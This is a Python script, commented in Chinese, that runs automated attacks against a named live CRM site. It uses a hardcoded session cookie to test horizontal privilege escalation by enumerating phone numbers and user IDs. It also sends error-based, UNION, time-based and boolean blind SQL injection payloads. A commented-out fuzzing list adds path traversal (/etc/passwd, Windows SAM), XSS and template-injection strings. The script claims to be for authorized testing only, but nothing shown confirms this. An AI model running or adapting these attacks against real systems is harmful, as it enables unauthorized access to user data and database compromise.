#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Time    : 2026/3/19 17:11 
@Author  : 
@File    : safe.py
@ProjectName: CRM 
@Description: 
'''
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CRM系统安全测试脚本
测试目标：水平越权漏洞和SQL注入漏洞
目标URL: https://crm.blzt888.com/crm_v2/system.user_search/index.html
"""

import requests
import urllib.parse
import time
from typing import List, Dict, Tuple
import json

# ==================== 配置区域 ====================

# 目标基础URL
BASE_URL = "https://crm.blzt888.com/crm_v2/system.user_search/index.html"

# 请求头配置
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    # 根据实际情况添加Cookie或其他认证信息
    'Cookie': 'jmftou=003701fb978b67f42cf862a117d855dc',
}

# 超时设置（秒）
TIMEOUT = 10

# 延迟设置（秒）- 用于时间盲注测试
TIME_DELAY = 3


# ==================== 工具函数 ====================

def print_separator(title: str) -> None:
    """打印分隔线"""
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def send_request(url: str, params: Dict = None, method: str = 'GET') -> Tuple[bool, any]:
    """
    发送HTTP请求

    Args:
        url: 请求URL
        params: 请求参数
        method: 请求方法（GET/POST）

    Returns:
        (是否成功, 响应内容或错误信息)
    """
    try:
        if method.upper() == 'GET':
            response = requests.get(
                url,
                params=params,
                headers=HEADERS,
                timeout=TIMEOUT,
                verify=False,  # 忽略SSL证书验证（仅测试用）
                allow_redirects=True
            )
        else:
            response = requests.post(
                url,
                data=params,
                headers=HEADERS,
                timeout=TIMEOUT,
                verify=False,
                allow_redirects=True
            )

        return True, response

    except requests.exceptions.Timeout:
        return False, "请求超时"
    except requests.exceptions.ConnectionError:
        return False, "连接错误"
    except requests.exceptions.RequestException as e:
        return False, f"请求异常: {str(e)}"


def analyze_response(response: requests.Response, test_type: str) -> None:
    """
    分析响应内容，判断是否存在漏洞

    Args:
        response: HTTP响应对象
        test_type: 测试类型（水平越权/SQL注入）
    """
    print(f"\n[响应状态码] {response.status_code}")
    print(f"[响应长度] {len(response.content)} 字节")
    print(f"[响应时间] {response.elapsed.total_seconds():.3f} 秒")

    # 显示部分响应内容
    content_preview = response.text[:500] if len(response.text) > 500 else response.text
    print(f"\n[响应内容预览]\n{content_preview}")

    # 检查常见的错误信息
    error_keywords = [
        'error', 'exception', 'sql', 'mysql', 'oracle', 'syntax',
        '错误', '异常', '语法', '数据库', '查询'
    ]

    content_lower = response.text.lower()
    found_errors = [kw for kw in error_keywords if kw in content_lower]

    if found_errors:
        print(f"\n[!] 检测到可能存在的错误关键词: {', '.join(found_errors)}")


# ==================== 水平越权测试 ====================

def test_horizontal_privilege_escalation():
    """
    水平越权测试

    测试场景：
    1. 修改mobile参数，尝试访问其他用户的手机号
    2. 修改app_userid参数，尝试访问其他用户ID
    3. 修改unionid参数，尝试访问其他unionid
    4. 删除某些参数，测试是否可以绕过权限检查
    """
    print_separator("水平越权漏洞测试")

    # 测试用例列表
    test_cases = [
        {
            "name": "原始请求（基准测试）",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000",
                "app_userid": "",
                "unionid": ""
            },
            "description": "使用原始参数进行基准请求"
        },
        {
            "name": "修改mobile参数-测试手机号遍历",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000001",  # 修改手机号
                "app_userid": "",
                "unionid": ""
            },
            "description": "尝试查询其他手机号的用户信息"
        },
        {
            "name": "修改mobile参数-测试手机号范围",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13800138000",  # 不同的手机号
                "app_userid": "",
                "unionid": ""
            },
            "description": "尝试查询其他手机号的用户信息"
        },
        {
            "name": "修改app_userid参数-测试用户ID遍历",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "10001",  # 尝试其他用户ID
                "unionid": ""
            },
            "description": "尝试通过用户ID查询其他用户信息"
        },
        {
            "name": "修改app_userid参数-测试用户ID范围",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "10086",  # 尝试其他用户ID
                "unionid": ""
            },
            "description": "尝试通过用户ID查询其他用户信息"
        },
        {
            "name": "修改unionid参数",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "",
                "unionid": "test_unionid_12345"  # 尝试其他unionid
            },
            "description": "尝试通过unionid查询其他用户信息"
        },
        {
            "name": "删除mobile参数-测试参数缺失",
            "params": {
                "spm": "m-204-254-411",
                # mobile参数被删除
                "app_userid": "",
                "unionid": ""
            },
            "description": "测试删除参数后是否可以绕过权限检查"
        },
        {
            "name": "同时修改多个参数",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13800138000",
                "app_userid": "99999",
                "unionid": "malicious_unionid"
            },
            "description": "同时修改多个参数进行测试"
        },
        {
            "name": "测试特殊字符-手机号参数",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000'",  # 添加单引号
                "app_userid": "",
                "unionid": ""
            },
            "description": "在手机号参数中添加特殊字符"
        },
        {
            "name": "测试空值参数",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "",
                "unionid": ""
            },
            "description": "所有查询参数为空"
        }
    ]

    # 执行测试用例
    results = []

    for i, test_case in enumerate(test_cases, 1):
        print(f"\n{'─' * 70}")
        print(f"测试用例 {i}: {test_case['name']}")
        print(f"说明: {test_case['description']}")
        print(f"参数: {test_case['params']}")

        # 发送请求
        success, result = send_request(BASE_URL, test_case['params'])

        if success:
            analyze_response(result, "水平越权")

            # 记录结果用于对比
            results.append({
                'name': test_case['name'],
                'status_code': result.status_code,
                'content_length': len(result.content),
                'response_time': result.elapsed.total_seconds()
            })
        else:
            print(f"\n[✗] 请求失败: {result}")
            results.append({
                'name': test_case['name'],
                'error': result
            })

        # 添加延迟，避免请求过快
        time.sleep(0.5)

    # 结果对比分析
    print_separator("水平越权测试结果分析")

    if len(results) > 1:
        baseline = results[0]  # 以第一个请求作为基准

        print(f"\n基准测试: {baseline['name']}")
        print(f"  状态码: {baseline.get('status_code', 'N/A')}")
        print(f"  响应长度: {baseline.get('content_length', 'N/A')} 字节")
        print(f"  响应时间: {baseline.get('response_time', 'N/A'):.3f} 秒")

        print("\n对比分析:")
        for result in results[1:]:
            print(f"\n{result['name']}:")

            if 'error' in result:
                print(f"  [错误] {result['error']}")
                continue

            # 对比状态码
            if result.get('status_code') != baseline.get('status_code'):
                print(f"  [!] 状态码不同: {result.get('status_code')} vs {baseline.get('status_code')}")
            else:
                print(f"  [✓] 状态码相同: {result.get('status_code')}")

            # 对比响应长度（如果差异超过10%则认为不同）
            length_diff = abs(result.get('content_length', 0) - baseline.get('content_length', 0))
            length_threshold = baseline.get('content_length', 0) * 0.1

            if length_diff > length_threshold:
                print(f"  [!] 响应长度差异较大: {result.get('content_length')} vs {baseline.get('content_length')} (差异: {length_diff} 字节)")
            else:
                print(f"  [✓] 响应长度相近: {result.get('content_length')} 字节")

            # 对比响应时间
            time_diff = abs(result.get('response_time', 0) - baseline.get('response_time', 0))
            if time_diff > 1.0:
                print(f"  [!] 响应时间差异较大: {result.get('response_time'):.3f}s vs {baseline.get('response_time'):.3f}s")


# ==================== SQL注入测试 ====================

def test_sql_injection():
    """
    SQL注入测试

    测试场景：
    1. 基于错误的SQL注入
    2. 基于时间的盲注
    3. 基于布尔的盲注
    4. UNION注入
    """
    print_separator("SQL注入漏洞测试")

    # ==================== 1. 基于错误的SQL注入测试 ====================
    print("\n" + "─" * 70)
    print("测试类型 1: 基于错误的SQL注入")

    error_based_payloads = [
        # 单引号测试
        {
            "name": "单引号测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000'",
                "app_userid": "",
                "unionid": ""
            }
        },
        # 双引号测试
        {
            "name": "双引号测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": '13000000000"',
                "app_userid": "",
                "unionid": ""
            }
        },
        # 单引号+注释
        {
            "name": "单引号+注释(--)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000'--",
                "app_userid": "",
                "unionid": ""
            }
        },
        # 单引号+注释(#)
        {
            "name": "单引号+注释(#)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000'#",
                "app_userid": "",
                "unionid": ""
            }
        },
        # OR语句测试
        {
            "name": "OR 1=1测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' OR '1'='1",
                "app_userid": "",
                "unionid": ""
            }
        },
        {
            "name": "OR 1=1测试(数值型)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' OR 1=1--",
                "app_userid": "",
                "unionid": ""
            }
        },
        # AND语句测试
        {
            "name": "AND 1=1测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' AND '1'='1",
                "app_userid": "",
                "unionid": ""
            }
        },
        {
            "name": "AND 1=2测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' AND '1'='2",
                "app_userid": "",
                "unionid": ""
            }
        },
        # ORDER BY测试
        {
            "name": "ORDER BY测试(列数探测)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' ORDER BY 1--",
                "app_userid": "",
                "unionid": ""
            }
        },
        {
            "name": "ORDER BY测试(列数探测-10)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' ORDER BY 10--",
                "app_userid": "",
                "unionid": ""
            }
        },
        # UNION测试
        {
            "name": "UNION SELECT测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' UNION SELECT 1,2,3--",
                "app_userid": "",
                "unionid": ""
            }
        },
        {
            "name": "UNION SELECT NULL测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' UNION SELECT NULL,NULL,NULL--",
                "app_userid": "",
                "unionid": ""
            }
        }
    ]

    # 执行基于错误的SQL注入测试
    for payload in error_based_payloads:
        print(f"\n测试Payload: {payload['name']}")
        print(f"参数: {payload['params']}")

        success, result = send_request(BASE_URL, payload['params'])

        if success:
            analyze_response(result, "SQL注入")

            # 检查SQL错误特征
            sql_error_keywords = [
                'sql syntax', 'mysql', 'ora-', 'pl/sql', 'error in your sql',
                'sqlstate', 'odbc', 'jdbc', 'incorrect syntax',
                '语法错误', '数据库错误', '查询错误'
            ]

            content_lower = result.text.lower()
            found_sql_errors = [kw for kw in sql_error_keywords if kw in content_lower]

            if found_sql_errors:
                print(f"\n[!!!] 检测到SQL错误特征: {', '.join(found_sql_errors)}")
                print("[!!!] 可能存在SQL注入漏洞！")
        else:
            print(f"\n[✗] 请求失败: {result}")

        time.sleep(0.5)

    # ==================== 2. 基于时间的盲注测试 ====================
    print("\n" + "─" * 70)
    print("测试类型 2: 基于时间的盲注")

    time_based_payloads = [
        # MySQL SLEEP函数
        {
            "name": "MySQL SLEEP测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": f"13000000000' AND SLEEP({TIME_DELAY})--",
                "app_userid": "",
                "unionid": ""
            },
            "expected_delay": TIME_DELAY
        },
        # MySQL BENCHMARK函数
        {
            "name": "MySQL BENCHMARK测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": f"13000000000' AND BENCHMARK(5000000,SHA1('test'))--",
                "app_userid": "",
                "unionid": ""
            },
            "expected_delay": 2  # 预期延迟约2秒
        },
        # PostgreSQL PG_SLEEP
        {
            "name": "PostgreSQL PG_SLEEP测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": f"13000000000'; SELECT PG_SLEEP({TIME_DELAY})--",
                "app_userid": "",
                "unionid": ""
            },
            "expected_delay": TIME_DELAY
        },
        # SQL Server WAITFOR DELAY
        {
            "name": "SQL Server WAITFOR测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": f"13000000000'; WAITFOR DELAY '0:0:{TIME_DELAY}'--",
                "app_userid": "",
                "unionid": ""
            },
            "expected_delay": TIME_DELAY
        }
    ]

    # 执行基于时间的盲注测试
    for payload in time_based_payloads:
        print(f"\n测试Payload: {payload['name']}")
        print(f"参数: {payload['params']}")

        start_time = time.time()
        success, result = send_request(BASE_URL, payload['params'])
        end_time = time.time()

        actual_delay = end_time - start_time

        if success:
            print(f"\n[响应状态码] {result.status_code}")
            print(f"[实际响应时间] {actual_delay:.3f} 秒")
            print(f"[预期延迟时间] {payload['expected_delay']} 秒")

            # 判断是否存在时间盲注
            if actual_delay >= payload['expected_delay'] - 0.5:
                print(f"\n[!!!] 响应时间符合预期延迟！")
                print("[!!!] 可能存在时间盲注漏洞！")
            else:
                print(f"\n[✓] 响应时间正常")
        else:
            print(f"\n[✗] 请求失败: {result}")

        time.sleep(0.5)

    # ==================== 3. 基于布尔的盲注测试 ====================
    print("\n" + "─" * 70)
    print("测试类型 3: 基于布尔的盲注")

    boolean_based_payloads = [
        # 真条件
        {
            "name": "真条件测试 (AND 1=1)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' AND 1=1--",
                "app_userid": "",
                "unionid": ""
            },
            "condition": True
        },
        # 假条件
        {
            "name": "假条件测试 (AND 1=2)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000' AND 1=2--",
                "app_userid": "",
                "unionid": ""
            },
            "condition": False
        },
        # 基准测试
        {
            "name": "基准测试(无注入)",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "13000000000",
                "app_userid": "",
                "unionid": ""
            },
            "condition": "baseline"
        }
    ]

    boolean_results = []

    # 执行基于布尔的盲注测试
    for payload in boolean_based_payloads:
        print(f"\n测试Payload: {payload['name']}")
        print(f"条件: {payload['condition']}")

        success, result = send_request(BASE_URL, payload['params'])

        if success:
            boolean_results.append({
                'name': payload['name'],
                'condition': payload['condition'],
                'status_code': result.status_code,
                'content_length': len(result.content),
                'response_time': result.elapsed.total_seconds()
            })

            print(f"\n[响应状态码] {result.status_code}")
            print(f"[响应长度] {len(result.content)} 字节")
        else:
            print(f"\n[✗] 请求失败: {result}")

        time.sleep(0.5)

    # 分析布尔盲注结果
    if len(boolean_results) >= 3:
        print("\n布尔盲注分析:")

        baseline = [r for r in boolean_results if r['condition'] == 'baseline'][0]
        true_cond = [r for r in boolean_results if r['condition'] == True][0]
        false_cond = [r for r in boolean_results if r['condition'] == False][0]

        # 对比真条件和假条件的响应
        if true_cond['content_length'] != false_cond['content_length']:
            print(f"[!] 真条件和假条件的响应长度不同:")
            print(f"    真条件: {true_cond['content_length']} 字节")
            print(f"    假条件: {false_cond['content_length']} 字节")
            print("[!] 可能存在布尔盲注漏洞！")
        else:
            print(f"[✓] 真条件和假条件的响应长度相同")

    # ==================== 4. 测试其他参数 ====================
    print("\n" + "─" * 70)
    print("测试类型 4: 测试app_userid和unionid参数的SQL注入")

    other_params_payloads = [
        # 测试app_userid参数
        {
            "name": "app_userid参数-单引号测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "10001'",
                "unionid": ""
            }
        },
        {
            "name": "app_userid参数-OR 1=1测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "10001 OR 1=1",
                "unionid": ""
            }
        },
        # 测试unionid参数
        {
            "name": "unionid参数-单引号测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "",
                "unionid": "test'"
            }
        },
        {
            "name": "unionid参数-OR 1=1测试",
            "params": {
                "spm": "m-204-254-411",
                "mobile": "",
                "app_userid": "",
                "unionid": "' OR '1'='1"
            }
        },
        # 测试spm参数
        {
            "name": "spm参数-单引号测试",
            "params": {
                "spm": "m-204-254-411'",
                "mobile": "13000000000",
                "app_userid": "",
                "unionid": ""
            }
        }
    ]

    # 执行其他参数的SQL注入测试
    for payload in other_params_payloads:
        print(f"\n测试Payload: {payload['name']}")
        print(f"参数: {payload['params']}")

        success, result = send_request(BASE_URL, payload['params'])

        if success:
            analyze_response(result, "SQL注入")
        else:
            print(f"\n[✗] 请求失败: {result}")

        time.sleep(0.5)


# ==================== 综合测试函数 ====================

def run_all_tests():
    """运行所有安全测试"""
    print("\n" + "█" * 70)
    print("█" + " " * 68 + "█")
    print("█" + " " * 15 + "CRM系统安全测试脚本".center(38) + " " * 15 + "█")
    print("█" + " " * 68 + "█")
    print("█" + " " * 20 + "测试目标:".ljust(48) + "█")
    print("█" + f"  {BASE_URL}".ljust(69) + "█")
    print("█" + " " * 68 + "█")
    print("█" + " " * 20 + "测试项目:".ljust(48) + "█")
    print("█" + " " * 25 + "1. 水平越权漏洞测试".ljust(43) + "█")
    print("█" + " " * 25 + "2. SQL注入漏洞测试".ljust(43) + "█")
    print("█" + " " * 68 + "█")
    print("█" * 70)

    # 禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # 执行水平越权测试
    test_horizontal_privilege_escalation()

    # 执行SQL注入测试
    test_sql_injection()

    # 总结
    print_separator("测试完成")
    print("\n测试总结:")
    print("1. 已完成水平越权漏洞测试")
    print("2. 已完成SQL注入漏洞测试（包含错误注入、时间盲注、布尔盲注）")
    print("\n注意事项:")
    print("- 本脚本仅用于授权的安全测试")
    print("- 请确保已获得测试授权")
    print("- 测试结果需要人工进一步验证")
    print("- 建议结合业务逻辑进行深入测试")

    print("\n" + "█" * 70)


# ==================== 主函数 ====================

if __name__ == "__main__":
    """
    主函数入口
    
    使用方法:
    1. 直接运行所有测试: python script.py
    2. 在代码中调用特定测试函数
    3. 根据需要修改HEADERS中的Cookie等认证信息
    """

    try:
        # 运行所有测试
        run_all_tests()

    except KeyboardInterrupt:
        print("\n\n[!] 用户中断测试")
    except Exception as e:
        print(f"\n[✗] 发生未预期的错误: {str(e)}")
        import traceback
        traceback.print_exc()


# # ==================== 扩展功能 ====================
#
# def test_with_authentication():
#     """
#     带认证的测试示例
#
#     在实际测试中，需要添加有效的认证信息（如Cookie、Token等）
#     """
#     # 配置认证信息
#     auth_headers = HEADERS.copy()
#     auth_headers.update({
#         'Cookie': 'your_session_cookie=value',
#         'Authorization': 'Bearer your_token_here',
#         # 其他认证头
#     })
#
#     # 测试需要认证的接口
#     # ... 具体测试代码 ...
#
#
# def automated_parameter_fuzzing():
#     """
#     自动化参数模糊测试
#
#     对所有参数进行模糊测试，发现潜在的漏洞
#     """
#     # 参数模糊测试payload列表
#     fuzz_payloads = [
#         "'", '"', '\\', '/', '/*', '*/', '--', '#',
#         '../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam',
#         '<script>alert(1)</script>',
#         '${7*7}', '{{7*7}}',
#         '../../../', '....//....//....//',
#         'admin' * 100,  # 长度测试
#     ]
#
#     # 遍历所有参数进行测试
#     params_list = ['mobile', 'app_userid', 'unionid', 'spm']
#
#     for param in params_list:
#         for payload in fuzz_payloads:
#             test_params = {
#                 "spm": "m-204-254-411",
#                 "mobile": "13000000000",
#                 "app_userid": "",
#                 "unionid": ""
#             }
#             test_params[param] = payload
#
#             print(f"\n测试参数: {param}, Payload: {payload}")
#             success, result = send_request(BASE_URL, test_params)
#
#             if success:
#                 # 分析响应
#                 if result.status_code != 200:
#                     print(f"[!] 异常状态码: {result.status_code}")
#                 # 可以添加更多检测逻辑
#
#             time.sleep(0.3)
#
#
# def generate_test_report():
#     """
#     生成测试报告
#
#     将测试结果输出为HTML或JSON格式的报告
#     """
#     report = {
#         'target': BASE_URL,
#         'test_date': time.strftime('%Y-%m-%d %H:%M:%S'),
#         'tests': []
#     }
#
#     # 这里可以收集测试结果并生成报告
#     # report['tests'].append({...})
#
#     # 输出JSON报告
#     with open('security_test_report.json', 'w', encoding='utf-8') as f:
#         json.dump(report, f, ensure_ascii=False, indent=2)
#
#     print("\n[✓] 测试报告已生成: security_test_report.json")
